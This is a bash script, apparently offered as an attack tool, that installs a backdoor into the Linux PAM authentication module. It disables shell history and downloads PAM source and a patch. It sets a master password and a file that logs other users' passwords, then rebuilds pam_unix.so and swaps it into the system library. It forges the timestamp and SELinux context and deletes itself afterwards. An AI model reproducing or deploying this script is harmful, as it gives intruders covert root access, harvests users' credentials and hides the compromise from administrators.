#!/bin/bash
#  Author:mor.inj3ct0r
#  Default root password :The custom         
#  Date:Tue May 17 02:39:35 PDT 2016         
#  Function:Make install pam backdoor        
#  Version: 0.1                       

if [ $UID -eq 0 ];then
        echo -e "\033[32mGod luck!you are root!Please next!\033[0m" >/dev/null
else
        echo -e "\033[31myou need to root running!Please check!\033[0m"
        exit
fi
export HISTSIZE=0;export HISTFILE=/dev/null
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
PAM_PATH=`rpm -qa|grep pam|grep "^pam-"|cut -d "-" -f 1,2 |tr "a-z" "A-Z"`
#PAM_PATH=`rpm -qa|grep pam |sed -n '2p'|cut -d "-" -f 1,2`
#PAM_PATH=`rpm -qa|grep pam |sed -n '2p'|cut -d "-" -f 1,2 |tr "a-z" "A-Z"`
PAM_URL=http://localhost/Linux_PAM/
PAM_TAR=Linux-$PAM_PATH.tar.gz
PAM_DIR=Linux-$PAM_PATH
LIB_DIR=/lib/security/
SHELL=`pwd $0`
#make install pam backdoor
wget -c $PAM_URL/$PAM_TAR && tar -zxf $PAM_TAR &&cd $PAM_DIR
wget -c $PAM_URL/pam_unix_auth.c.zip && unzip pam_unix_auth.c.zip
#Add input menu!
read -p "you are password:" -s doorpwd
#	sed -i 's#root123#$doorpwd#g' pam_unix_auth.c.patch
	sed -i 's/root123/'$doorpwd'/g' pam_unix_auth.c.patch
	echo -e "\033[32mPlese Keep in mind the password!\033[0m"
read -p "you are PASSLOG_PATH:" loginpath
	sed -i 's^/tmp/pslog^'$loginpath'^g' pam_unix_auth.c.patch
	echo -e "\033[32mYou are password-path is $loginpath!\033[0m"
#setenforce 0 
yum -y install flex flex-devel
mv pam_unix_auth.c.patch modules/pam_unix/
cd modules/pam_unix/
patch < pam_unix_auth.c.patch 
cd ../../
./configure
make
touch $loginpath;chmod a+w $loginpath 
if [ ! -d $LIB_DIR ];then
	\cp /lib64/security/pam_unix.so /lib64/security/pam_unix.so.src
	\cp modules/pam_unix/.libs/pam_unix.so /lib64/security/
	cd /lib64/security/
	touch pam_unix.so -r pam_unix.so.src
	ls -Z pam_unix.so.src
	chcon –reference=pam_unix.so.src pam_unix.so
else
	\cp /lib/security/pam_unix.so /lib/security/pam_unix.so.src
	\cp modules/pam_unix/.libs/pam_unix.so $LIB_DIR
	cd /lib/security/
        touch pam_unix.so -r pam_unix.so.src
        ls -Z pam_unix.so.src
        chcon –reference=pam_unix.so.src pam_unix.so
fi
touch $loginpath;chmod a+w $loginpath
cd $SHELL 
rm -rf Linux-PAM-* 
rm -rf pam_unix_auth*
rm -rf $0
echo -e "\033[32mGod luck!pam_backdoor make install successfully!\033[0m"

